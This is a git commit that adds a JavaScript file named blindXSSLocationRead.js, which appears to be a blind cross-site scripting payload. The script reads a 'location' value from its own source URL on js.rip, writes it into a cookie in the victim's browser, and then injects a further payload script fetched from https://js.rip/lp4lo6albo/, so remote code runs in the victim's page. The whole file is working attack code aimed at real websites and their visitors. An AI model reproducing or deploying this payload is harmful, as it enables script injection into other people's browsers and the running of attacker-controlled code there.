16447cf56212c14346a808cd2dc1698d662ac08e
Neuuen <noamjneumann@gmail.com>
2023-10-20 01:04:52 +0100

    Create 126dbyh3248dbs3sd.js

---
+++ blindXSSLocationRead.js
@@ -0,0 +1,37 @@
+(function() {
+    // Check if the neuuen cookie is already set
+    var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)neuuen\s*\=\s*([^;]*).*$)|^.*$/, "$1");
+
+    if (cookieValue) {
+        console.log("neuuen cookie is already set. Exiting.");
+        return;
+    }
+
+    // Extract location parameter from the invoking script's URL
+    var scripts = document.getElementsByTagName('script');
+    var locationParam = null;
+
+    for (var i = 0; i < scripts.length; i++) {
+        var script = scripts[i];
+        
+        if (script.src && script.src.indexOf('https://js.rip/lp4lo6albo/') !== -1) {
+            locationParam = (new URL(script.src)).searchParams.get("location");
+            break; 
+        }
+    }
+
+    // If location parameter was found, set it as the neuuen cookie
+    if (locationParam) {
+        document.cookie = "neuuen=" + locationParam + "; path=/";
+        console.log("neuuen cookie set with value:", locationParam);
+    } else {
+        console.log("Location parameter not found. Exiting.");
+        return;
+    }
+
+    // Inject the payload script again
+    var payloadScript = document.createElement('script');
+    payloadScript.src = "https://js.rip/lp4lo6albo/";
+    document.body.appendChild(payloadScript);
+
+})();
